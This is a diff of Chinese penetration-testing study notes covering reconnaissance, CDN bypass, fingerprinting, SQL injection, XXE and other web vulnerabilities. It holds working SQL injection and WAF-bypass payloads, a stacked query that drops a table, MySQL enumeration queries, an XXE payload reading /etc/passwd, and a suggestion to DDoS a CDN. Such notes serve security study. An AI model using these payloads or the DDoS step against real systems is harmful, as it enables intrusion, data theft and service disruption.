@@ -1,149 +1,135 @@
 # 信息收集
 
-渗透测试和渗透攻击的第一步是收集目标信息，俗称踩点。信息收集得越全面，就越容易找到防御薄弱点。较重要的信息包括：
+渗透测试和渗透攻击的第一步是收集目标信息，俗称踩点。信息收集得越全面，就越容易找到防御薄弱点。最重要的信息是**域名与IP地址**、**端口与服务**
 
-- 基础信息：域名、真实IP、开放端口
-- 应用信息：主机上运行了哪些程序，以及它们的版本
-- 目录信息：主机上的目录和文件
-- 防护信息：WAF，防火墙等
+例如，假设搜集了一家名叫Polygon的企业（公司名、域名、IP地址等信息均为虚构，与现实中的企业、网站无关），搜集过程如下：
 
-这些信息也叫网络资产信息，[网络空间资产探测与分析技术研究](https://www.gjbmj.gov.cn/n1/2022/0422/c411145-32406257.html)列出的信息以及收集方法如下表。不过这篇文章讲的更多是大规模数据搜集与分析，和网络渗透稍有不同，列在这里仅作参考
+```mermaid
+graph LR
+    begin([开始收集])
+    
+    %% 域名、IP
+    begin -->|收集域名、IP地址| d1(service.polygon.com) & d2("
+        passport.polygon.com
+        mail.polygon.com
+        fuwu.polygon-cn.com
+        183.2.172.17
+        ……
+    ")
+    
+    %% 端口、服务
+    d1 -->|探测端口| ssh(22) & http(443)
+    ssh -->|识别服务| ssh_detail(OpenSSH 9.9)
+    http -->|识别服务| http_detail("
+        Apache 2.4.52
+        PHP 8.1.2
+        MySQL 8.0
+        WordPress 6.8.1
+        ……
+    ")
+    d2 -..->|探测端口、识别服务| d2service(……)
+    
+    %% 梳理资产
+    fin([梳理资产])
+    ssh_detail & http_detail & d2service --> fin
+```
 
-| 分类     | 包括                                                         | 相关信息                 | 常用收集方法                      |
-| -------- | ------------------------------------------------------------ | ------------------------ | --------------------------------- |
-| 硬件资产 | 各种网络设备，如主机、路由器、防火墙                         | 设备型号、网络拓扑结构   | 响应头部数据、banner等            |
-| 软件资产 | 网络设备上运行的软件，如操作系统、服务器框架、数据库管理系统、第三方应用等 | 安装了哪些软件、软件版本 | 响应头部数据、特殊URL、开放端口等 |
-| 数据资产 | 业务类型、业务数据等                                         |                          |                                   |
+这个例子中，首先找到`service.polygon.com`、`passport.polygon.com`等属于该公司的域名、IP地址。每个域名和IP地址对应该公司的一台主机，或者多台主机，又或是该公司租用的云服务器
 
-## 被动搜集
+然后，探测每个地址提供的服务。在`service.polygon.com`，发现22端口开放，提供SSH服务；443端口开放，提供HTTP服务，并识别到它使用的服务器、开发语言、后端数据库、CMS等信息；其他各地址也同理探测
 
-被动搜集指不直接访问目标，通过其他渠道获取目标信息。被动搜集较为隐蔽，通常不会留下痕迹，信息搜集的第一步通常都是被动搜集
+最后，梳理资产，剔除不属于目标的资产，并筛选出高价值资产。至此，信息收集暂告一段落。信息搜集的作用有两方面
 
-- **网络空间测绘工具**：俗称”黑暗搜索引擎“，可以获取目标的开放端口、使用的服务等信息
-  - [FOFA](https://fofa.info/)
-  - [Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）
-  - [钟馗之眼](https://www.zoomeye.org/)
-  - [鹰图平台](https://hunter.qianxin.com/)
-  - https://quake.360.net/quake/#/index
-  - https://x.threatbook.cn
+1. **找到攻击点位**：后续攻击可以针对搜集到的服务展开。首先可以找服务有没有N-day漏洞，然后可以从开放的服务寻找高发漏洞（比如，登录界面可能有弱口令，api可能有越权、信息泄露，上传页面可能有文件上传漏洞）
+2. **提高攻击效率**：知道服务用了什么组件，就可以专注尝试该组件的漏洞。例如，服务器用PHP开发，就不可能存在Java反序列化漏洞；后端是MySQL数据库，就不需要测试PostgreSQL的注入语句
 
-- **搜索引擎**：用Google等搜索引擎直接搜索目标网站相关信息，如公开的页面，新闻报导乃至配置文件、后台登录页面。用搜索引擎寻找关键信息称作Google Hacking或Google Dorking
-- **网站信息查询工具**：[爱站网](https://www.aizhan.com/)、[站长之家](https://tool.chinaz.com/)等网站集成了Whois域名查询、[ICP备案信息](https://beian.miit.gov.cn)查询、Ping检测等多项功能
-- **社会工程学**：从官网、社交媒体等渠道获取相关人员信息，联系这些人并骗取目标信息
+## 域名、IP地址
 
-## 基础信息
+### 原理
 
-### 子域名
+- **相似性**：同一个机构的网络资产很可能有共同特征。通过公开渠道找到一个资产，就能找到许多相似的网站
+  - **子域名**：组织通常以主域名为中心，扩展多个功能性子域名（如`api.example.com`、`admin.example.com`）。可通过DNS记录、爆破等方式寻找子域名
+  - **ICP备案、Whois查询**：我国网站均需要备案，可通过ICP备案信息查询同一机构的其他网站；whois查询可以查到域名注册者信息，也有相似效果
+  - **C段、旁站**：一个组织常将多个服务部署在同一网段（如`/24`网段，俗称C段）；部署在云服务器上的网站，有可能多个站点共享一个IP地址，称旁站
+  - **特征指纹**：同一机构的资产可能具有相同图标（`favicon.ico`），可能有相同关键字（如公司名、企业邮箱地址）
+  - **SSL证书**：可分析SSL证书的Subject Alternative Name（SAN）字段
+  - **相似域名**：企业可能注册多个拼写相近、品牌相关的域名，如百度除了`baidu.com`外还注册了`baidu.com.cn`（但相近域名大多未投入使用，价值不高）
+- **关联性**：同一机构的网络资产之间即使不相似，也很可能有关联
+  - **页面链接**：站点内页面可能包含其他资产的超链接，可以收集页面中的超链接并分析其指向的域名和路径
+  - **Javascript**：前端JS可能包含后端接口地址、开发域名、第三方服务或调试路径
+  - **社会学关联**：子公司的网站、乙方的网站（例如目标组织委托乙方设计办公系统，系统部署在乙方的服务器上，但系统内的数据都是目标组织的）
+- **小程序、APP**
 
-子域名和目标或多或少有联系，而且防护不一定有主域名那么严密，后续可以在其中找防护薄弱的目标
+### 方法与工具
 
-- 测绘工具：搜索`domain=target.com`
-- 搜索引擎：`site:target.com -site:www.target.com`
-- 信息查询工具：[子域名查询](https://tool.chinaz.com/subdomain/)
-- 爆破
+- **网络空间测绘工具**：俗称”黑暗搜索引擎“，可以搜索目标的开放端口、指纹等许多网络资产信息。信息搜集阶段，可以用它查询子域名、ICP备案等
+  - 国内：[鹰图平台](https://hunter.qianxin.com/)、[FOFA](https://fofa.info/)、[钟馗之眼](https://www.zoomeye.org/)、[Quake](https://quake.360.net/quake/#/index)、[微步](https://x.threatbook.cn)
+  - 国外：[Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）、[VirusTotal](https://www.virustotal.com/gui/home/upload)
+- **搜索引擎**：搜索引擎可以检索目标网站公开的页面，其中除了常规页面外，还有机会找到配置文件、后台登录页面等。也有机会找到各种社会学信息，如员工的邮箱、子公司等
+- **提取链接**：`JSFinder`
+- **子域名爆破**
 
-### IP地址
+### CDN绕过
 
-- DNS查询：`nslookup`
-- 测绘工具
-- 信息查询工具：[DNS查询](https://tool.chinaz.com/dns)，或者[Ping检测](https://ping.chinaz.com/)、[get-site-ip](https://get-site-ip.com/)
+若网站有多个IP地址，则网站很可能使用了CDN（Content Distribution Network）。通常，CDN节点开放的端口少、防护措施强，因此要尽量绕过CDN节点寻找真实IP地址
 
-若网站有多个IP地址，网站很可能使用了CDN（Content Distribution Network）、反向代理等，需要绕过CDN节点**寻找真实IP地址**
-
-- **相关域名**：相关站点经常在相同IP或同一C段，可尝试寻找子域名、父域名地址，若它们没开CDN就能从此地址找到主站
-- **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件源码分析（比如验证邮件、RSS邮件订阅）
-- **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址。最暴力的可以从全球访问，其中必定有服务器真实地址
-- **搜索特征文件**：部分文件不会缓存在CDN上，可以在网络测绘工具搜索这样的文件
+- **相关域名**：相关站点经常在同一IP段，可尝试访问其他资产的C段
+- **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件（比如验证邮件、RSS邮件订阅）分析
+- **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址
 - **DNS历史记录**：如[IP地址查询](https://site.ip138.com/)，找启用CDN之前的ip
 - **DDoS攻击**：打光网站CDN流量
 
 找到疑似真实IP后，首先可以多方法互相验证；然后可以尝试改Hosts，能正常访问就说明找到真实IP地址了
 
-### 端口及服务
+## 端口、服务
 
-找到真实IP地址后，就可以检查有哪些开放端口、各端口运行什么服务
+找到真实IP地址后，就可以探测哪些端口开放、各端口运行什么服务
 
 1. 测绘工具
-2. nmap扫描
+2. 扫描工具：nmap，masscan，fscan等
 
-```shell
-nmap -sn example.com/24	    # 主机发现
-nmap -sS exmample.com       # 扫描开放端口
-nmap -sS -sV $target -p 443 # 识别端口的服务
-```
+访问各端口，通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等），例如服务器返回Apache的默认404页面就可以推断服务器使用Apache；部分资源路径包含`wp-content`，可以推断服务器使用Word Press。这种方法叫做**指纹识别**
 
-除了目标本身以外，还可以扫旁注（同一IP地址的其他网站）、C段（`/24`IP段的其他网站）。有可能从中找到防御薄弱点
+**手工识别**
 
-## 应用信息
+- 操作系统
+  - 大小写敏感：Windows一般不区分大小写；Windows WSL和Windows 10以上版本可以配置区分大小写；Linux区分；MacOS默认不区分，但可以配置
+  - Ping数据包：Windows的TTL默认128，Linux取决于版本，但经常是64
+- 服务器
+- 数据库
+- 编程语言
 
-获取应用信息的主要方式是指纹识别，即通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等）。例如访问一个不存在的页面，看到Apache的默认404页面就可以推断服务器使用Apache；发现部分资源路径包含`wp-content`，可以推断服务器使用Word Press
+**指纹识别工具**：nmap的服务识别就是一种指纹识别；wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)等工具可用于识别网页服务器的指纹
 
-### 操作系统
+## 辅助信息
 
-- **大小写敏感**：修改路径大小写（注意域名不区分大小写，要改域名以外的部分，比如将`example.com/news`改成`example.com/NEws`），若正常显示则说明服务器不区分大小写
-  - Windows一般不区分大小写；Windows WSL和Windows 10以上版本可以配置区分大小写；Linux区分；MacOS默认不区分，但可以配置
+网络上很可能有许多不在目标服务器上，却能帮助进行渗透的信息，比如百度文库有员工上传的内部资料、微信公众号文章透露了人员组成等
 
-### 数据库
+有没有这类信息、它们有多大作用都是未知数，但不能完全忽略或是放弃寻找这些信息
 
-- **常见搭配**：可通过操作系统、服务器软件简单判断数据库，也可以反过来用数据库推断其他信息
-  1. Linux + apache / Nginx + PHP + MySQL
-  2. Linux + Tomcat + JSP + MySQL / Oracle
-  3. Windows + IIS + ASP.NET + MSSQL
-  4. Windows + IIS + ASP + Access
-- **开放端口**：如MySQL默认端口为3306，如果扫到3306端口开放/过滤，很可能使用MySQL
+## 梳理资产
 
-### 指纹识别工具
+以上方法如果找到了数量庞大的资产（这是非常有可能的！），就要从中筛选出“值得挖”的资产——当然，价值判断取决于渗透的目的，但一般来说，业务越重要、功能越多、系统越新，越有可能挖出高价值的漏洞
 
-nmap的服务识别就是一种指纹识别；wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)等工具可用于识别网页服务器的指纹
-
-## 目录信息
-
-寻找目录、文件信息，有可能发现敏感文件
-
-Fuzz Scan：暴力破解。字典：Web-Fuzzing-Box，fuzzDicts
-
-## 防护信息
-
-wafw00f用于识别waf。防护的识别和绕过都是较难的部分
-
-# Web漏洞
+# Web漏洞基础
 
 ## SQL注入
 
-### 流程
+### 基础
 
 1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，GET参数、POST参数、HTTP头、URL都不要错过
 
-2. **闭合语句**：尝试构造合法语句。例如完整查询语句为`SELECT * FROM users WHERE id=('$id') LIMIT 1`，需要构造注入内容`1') -- `让它成为合法语句。大多数时候都是黑盒测试，需要结合经验尝试单引号、双引号、反引号、括号等
+2. **闭合语句**：构造合法语句。例如，`id=1`能正常查询，加上单引号`id=1'`报错，尝试后发现`id=1')#`又能正常查询了,可以推测，服务器的查询语句应该类似`SELECT * FROM users WHERE id=('$id')`，`')`闭合了开括号、单引号，`#`注释了后面“多余”的`')`，下一步就可以在井号之前插入其他搜索条件，或者Union查询。闭合语句需要结合经验尝试单引号、双引号、反引号、括号等
    - 注意，若注入点是用引号括起来的数字，比如`id='1'`，MySQL会尝试`'1'`转换为数字再查找。因此即使引号没匹配`id=('1 or 1=1')`、被转义`id='1\'`，都能看似正常的返回。不要被骗
 
-3. **构造注入语句**
+3. **构造注入语句**：最基础的注入语句是Union注入，即通过联合查询获取额外信息
 
 ```sql
-# SELECT
 SELECT * FROM users WHERE id='1' ORDER BY 4;          # 判断数据列数
 SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;  # UNION查询
-
-# UPDATE
-UPDATE users SET name='hacker' WHERE id='114514';   # 改变写入的内容与条件
-UPDATE users SET name='user' WHERE id='' and (SELECT substring(pwd,1,1))='a';  # 盲注
 ```
 
-4. **获取数据**
-   - 判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
-   - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
-   - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）
-
-| 表名       | 字段名                                  | 包含信息                             |
-| ---------- | --------------------------------------- | ------------------------------------ |
-| `schemata` | `schema_name`                           | 数据库名                             |
-| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
-| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |
-
-```sql
--- 示例：获取users表的列名
-SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
-```
+4. **获取数据**：一般是先获取表名、各个表的字段名，然后爆破数据。具体方法因数据库而异，可参考Web漏洞利用部分
 
 ### 盲注
 
@@ -169,7 +155,7 @@ regexp, rlike, trim, insert, like;
 
 #### 延时盲注
 
-若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应（注意：sleep函数找到多少条结果就会延迟多少次，比如`sleep(0.1)`搜索到20条结果就会延迟$0.1 \times 20 = 2$秒，可以用这个方法判断表的行数
+若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应（注意：sleep函数找到多少条结果就会延迟多少次，比如`sleep(0.1)`搜索到20条结果就会延迟$0.1 \times 20 = 2$秒，可以用这个方法判断表的行数）
 
 ```sql
 SELECT name FROM users WHERE id='' UNION SELECT IF((1=1), sleep(5), 0);
@@ -187,7 +173,7 @@ SELECT rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状
 
 #### 报错盲注
 
-若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR。查询成功、查询失败、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能强行获得回显
+若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR。查询成功、查询无结果、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能强行获得回显
 
 ```sql
 SELECT exp(709 + (1=1));
@@ -208,23 +194,15 @@ SELECT load_file('backup.bak')
 
 #### 报错注入
 
-如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中
-
-向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名
+如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中。例如，向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名
 
 ```sql
 SELECT updatexml(1, concat(0x7e, (select user())), 2)
 ```
 
-下面语句据说利用随机GROUP BY有概率爆出错误，[参考](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2)，但我无法复现
-
-```sql
-SELECT count(*),concat((select user()),floor(rand()*2))a FROM information_schema.columns GROUP BY a
-```
-
 #### 堆叠注入
 
-一次注入多条语句。不过数据库API不一定支持
+一次注入多条语句。不过数据库API不一定支持，而且一般看不到回显，很难确认操作是否成功
 
 ```sql
 SELECT * FROM users WHERE id=1; drop users();
@@ -232,10 +210,10 @@ SELECT * FROM users WHERE id=1; drop users();
 
 #### 二次注入
 
-例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，就没有清洗，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码
+例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，没有清洗，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码
 
 ```sql
-UPDATE users SET pwd='pswd' WHERE name='admin' -- 
+UPDATE users SET pwd='pswd' WHERE name='admin' -- '
 ```
 
 ### 防护
@@ -243,10 +221,7 @@ UPDATE users SET pwd='pswd' WHERE name='admin' --
 - **预编译**、**参数化查询**：将语句和数据分离。一般是安全的，但表名、列名不能被占位符替代，如果允许拼接可能也有问题
 - **过滤**
   - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义。本意并不是防SQL注入的，只是恰好起到了一点效果
-  - **`mysql_real_escape_string`**：`addslashes`的上位替换。但是安全性也没有高很多
-  - **字符过滤**：禁用空格、引号、注释等特殊符号
-  - **关键字过滤**：用正则匹配`UNION`等常用于渗透攻击的关键字，删除它或者干脆拒绝访问（这种方法效率低、防不全，还容易把正常用户拦住）
-
+  - **关键字过滤**：禁用空格、引号、注释等特殊符号，禁用`UNION`等常用于渗透攻击的关键字。通常WAF会检测这些关键字并拦截
 - **内容检查**：检查参数内容，比如只允许用整数查询，或者检测到不正确日期格式就拒绝请求
 
 ### 绕过
@@ -256,27 +231,8 @@ UPDATE users SET pwd='pswd' WHERE name='admin' --
 - **宽字节注入**：对于使用反斜杠（`0x5c`）转义的防护手段，可以在合适位置插入一个字节，让它“吞掉”反斜杠
   - 若服务器使用utf-8、数据库使用GBK，注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。第一个字节可以是`0x81~0xa0, 0xa8~0xfd`的任意一个
   - 若使用utf-8编码，注入`%c0' or 1=1`，转义后前两字节为`%c0%5c`，被当作一个字符（因为UTF-8是变长编码，用最高几个比特辨认字符使用多少字节，`%c0`前3比特为`0b110`，被当作是一个长2字节的字符，详见[维基百科](https://en.wikipedia.org/wiki/UTF-8#Description)）。一般称作**Overlong Encoding**漏洞
-
-- **二次编码注入**：进行两次百分号编码，如`' ' -> %20 -> %25%20`；对普通字符编码，如`u%6eion`。若开发者错误地在SQL参数的转义、过滤后再进行一次URI解码，可导致注入
-- **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）。参见[SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)
-
-```sql
--- 空格过滤：注释/**/、其他空白符。参见上面的速查表链接
--- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
-SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
--- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
-SELECT * FROM users WHERE id=-1||name=0x61646d696e;
--- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
-SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
--- 闭合引号、括号绕过注释
-SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
--- Join查询绕过逗号
-SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
--- from for绕过逗号（只对substr和mid有用）
-SELECT * from users WHERE id=-1 || substr(database() from 1 for 1)='a';
-```
-
-小技巧参考：https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks
+- **二次编码注入**：数据可能多次解码，比如JSON将`\u0065`解码为`e`，XML将`&#101;`解码为`e`，多做一次”不必要“的编码有机会绕过关键字过滤
+- **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）
 
 ## 文件上传
 
@@ -378,17 +334,13 @@ XSS只能影响到用户前端，无法直接作用于服务器
 - SameSite Cookie
 - 验证Referer
 
-## 服务器端请求伪造（SSRF）
-
-服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者通过操纵服务器发出请求获取敏感信息，常用于内网横向
-
 ## 远程代码执行（RCE）
 
 远程代码执行（Remote Code Execution，RCE），也叫任意代码执行（Artibrary Code Execution，ACE）。网站使用`eval`等函数时，若用户可控制参数，则可以执行任意代码
 
 过滤绕过：https://wiki.wgpsec.org/knowledge/ctf/exec.html
 
-使用其他漏洞也有可能实现任意代码执行，比如用文件上传漏洞传一个WebShell，自然什么代码都能执行了。但这种间接实现RCE的通常不叫作RCE漏洞
+使用其他漏洞也有可能实现任意代码执行，比如用文件上传漏洞传一个WebShell，自然能执行任意代码了。但这种间接实现RCE的通常不叫作RCE漏洞
 
 ## 文件包含
 
@@ -402,14 +354,13 @@ XSS只能影响到用户前端，无法直接作用于服务器
 - 文件上传漏洞
 - PHP封装协议
 - 日志文件：如果服务器日志保存UA等信息，甚至可以将webshell注入到日志，再包含日志文件
-- 临时文件
-  - POST方法上传`multipart/form-data`，PHP会将文件存为临时文件，位于`php.ini`指定的`upload_tmp_dir`，默认为`/tmp`，文件名是`php + 4或6位随机字母/数字`，如`/tmp/phpY1WgtV`（可以在phpinfo的PHP Variables部分看到），php脚本运行结束后删除
+- 临时文件：POST方法上传`multipart/form-data`，PHP会将文件存为临时文件，位于`php.ini`指定的`upload_tmp_dir`，默认为`/tmp`，文件名是`php + 4或6位随机字母/数字`，如`/tmp/phpY1WgtV`
   - 在一次请求上传并利用临时文件：需要能够猜到临时文件名，比如使用通配符调用文件。CTF中有可能，实际业务中没有可行性
   - 让PHP崩溃阻止删除临时文件：难度较大，取决于PHP版本
 
 ## 逻辑漏洞
 
-逻辑漏洞是业务逻辑设计缺陷导致的漏洞。此类漏洞一般不会直接引起安全问题，但往往可以成为攻击切入口
+逻辑漏洞指业务逻辑的漏洞，它不会直接引起安全问题，但往往可以成为攻击切入口
 
 ### 越权访问
 
@@ -417,11 +368,9 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 发现数据包中传输用户信息（用户编号、用户组编号等）时，可以尝试修改这个值进行水平越权。如果知道高权限用户的数据包结构，还可以尝试垂直越权
 
-绕过其他业务逻辑实现本来不允许的操作也可以叫做广义的逻辑越权，比如通过修改UA访问移动端页面（虽然这种操作不算漏洞，一般也没有危害性），或者
+### 支付漏洞
 
-### 业务漏洞
-
-绕过业务逻辑，如修改优惠券金额、预测验证码、覆盖注册等
+绕过业务逻辑，影响业务数据。如修改优惠券金额、预测验证码、覆盖注册等
 
 ### 敏感信息泄露
 
@@ -432,6 +381,135 @@ XSS只能影响到用户前端，无法直接作用于服务器
 序列化和反序列化就是将对象转换为文本，以及将文本转换回对象的功能，它常用于对象的保存和传输。若Web应用未执行严格过滤，可以构造恶意数据，在反序列化过程中执行危险操作
 
 解析认证token、Session，传输json和XML、使用RMI协议时都可能有反序列化漏洞
+
+## XML外部实体（XXE）
+
+XML外部实体（XML eXternal Entity）可以引用外部数据，例如文件系统中的文件、互联网文件等。若XML解析器配置不当，可能引发LFI、RFI、SSRF等漏洞
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ANY [
+    <!ENTITY foo SYSTEM "file:///etc/passwd">
+    <!ENTITY % file SYSTEM "file:///var/www/html/upload/evil.dtd">
+]>
+<!-- 引入外部实体foo，并从文件导入DTD（文件中可以包含恶意实体） -->
+<x>&foo;</x>
+```
+
+若服务器配置允许，上面例子里的文件路径可以换成http协议，php封装协议，甚至`expect://<指令>`
+
+## 服务器端请求伪造（SSRF）
+
+服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者利用服务器发出请求，访问本不该能访问的信息（比如内网）的安全漏洞。容易出现SSRF漏洞的应用有通过URL上传图片、在线翻译等
+
+# Web漏洞利用
+
+## SQL注入
+
+https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/
+
+https://wiki.wgpsec.org/knowledge/web/sql_injection.html
+
+4. - 判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
+   - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
+   - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）
+
+| 表名       | 字段名                                  | 包含信息                             |
+| ---------- | --------------------------------------- | ------------------------------------ |
+| `schemata` | `schema_name`                           | 数据库名                             |
+| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
+| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |
+
+### 绕过技巧
+
+虽然写网站的程序员很少用关键字过滤（写网站的人一般用参数化查询一劳永逸；不会用参数化查询的人大概也不懂关键字过滤），但WAF等防护系统会采用特征识别危险请求。防护系统不能影响正常业务，识别的关键字肯定是有限的
+
+- [SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)
+- https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks
+
+```sql
+-- 空格过滤：注释/**/、其他空白符。参见上面的速查表链接
+-- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
+SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
+
+-- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
+SELECT * FROM users WHERE id=-1||name=0x61646d696e;
+
+-- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
+SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
+
+-- 闭合引号、括号绕过注释
+SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
+
+-- Join查询绕过逗号
+SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
+
+-- substr和mid函数用from for代替逗号
+SELECT * from users WHERE id=-1 || substr(database() from 1 for 1)='a';
+```
+
+### MySQL
+
+参考：https://www.cnblogs.com/20175211lyz/p/12358725.html
+
+**数据库名**
+
+```sql
+# MySQL
+SELECT schema_name FROM information_schema.schemata;
+```
+
+**表名**
+
+```sql
+# MySQL
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'db_name';
+# MySQL 5.6+
+SELECT table_name from mysql.innodb_table_stats WHERE database_name = database();
+# MySQL 5.7.9+
+# 包含in
+SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
+SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = database();
+SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = database();
+SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = database();
+# 不包含in
+SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = database();
+SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = database();
+SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = database();
+# 通过表文件的存储路径获取表名
+SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP database();
+SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP database();
+SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP database();
+# 通过performance schema
+SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
+```
+
+**列名**
+
+```sql
+# mysql
+SELECT column_name FROM information_schema.columns
+WHERE table_name="table" AND table_schema="db_name";
+```
+
+特殊：无列名注入
+
+```sql
+SELECT a FROM (select 1 `a`, 2 `b` union select * from `test_table`)x;
+
+# 无逗号、使用join的版本
+SELECT a FROM (
+    (select * from (select 1 `a`)p join (select 2 `b`)q where 0)x
+    union
+    select * from test_table
+)x;
+```
+
+## 反序列化
 
 ### PHP
 
